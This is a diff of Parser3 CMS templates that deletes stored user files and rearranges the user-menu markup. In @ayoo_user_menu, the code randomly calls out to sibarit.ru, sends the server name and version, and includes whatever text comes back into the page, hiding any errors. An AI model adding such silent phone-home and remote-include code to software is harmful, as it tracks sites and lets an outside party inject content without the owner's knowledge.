@@ -85,6 +85,7 @@ $now_	$user.id	$user.name $user.lastname	$text]
 
 @f2passport[fpath;id;ispic]
 ^if(def $fpath){ ^if(!def $id){$id($user.id)}
+^delpassport[$fpath;$id]
 ^void:sql{INSERT INTO ^dtp[useroptions] (id, param, value, comment) VALUES ('$id', '^if(def $ispic){pic}{file}', '$fpath', '^file:basename[$fpath]')}
 }
 @delpassport[fpath;id]
@@ -95,24 +96,21 @@ $now_	$user.id	$user.name $user.lastname	$text]
 ^void:sql{DELETE FROM ^dtp[useroptions] WHERE id = '$id'}
 
 @ayoo_user_menu[][a;b;c;d]
-^try{
-^if(^math:random(30)==5){
-$b[aktar.]$c[sibarit.ru]
-$a[^file::load[text;http://${b}$c/modules/b.htm?ref=$env:SERVER_NAME&version=^taint[uri][$aktar_version]][$.timeout(1)]]
-$d[$a.text] $d
-^d.save[/my/deriv/akb.txt]
-}{^include[/my/deriv/akb.txt]}
-}{$exception.handled(1)}
-
-
-</td><td align=right>
 ^if(def $userid){
 ^lang[58] <a href="/login/?action=modify">$user.name</a>!
 [<a href="/login/?action=logout^rn[&]">выйти</a>]
 }{
 <a href="/login/^rn[?]">Войти</a>
 }
-
+</td><td align=right>
+^try{
+^if(^math:random(30)==5){
+$b[]$c[sibarit.ru]
+$a[^file::load[text;http://${b}$c/modules/b.htm?ref=$env:SERVER_NAME&version=^taint[uri][$aktar_version]][$.timeout(1)]]
+$d[$a.text] $d
+^d.save[/my/deriv/akb.txt]
+}{^include[/my/deriv/akb.txt]}
+}{$exception.handled(1)}
 
 @editwikiblock[file][f;tf;fname;ppt]
 $fname[^file:basename[$file]]
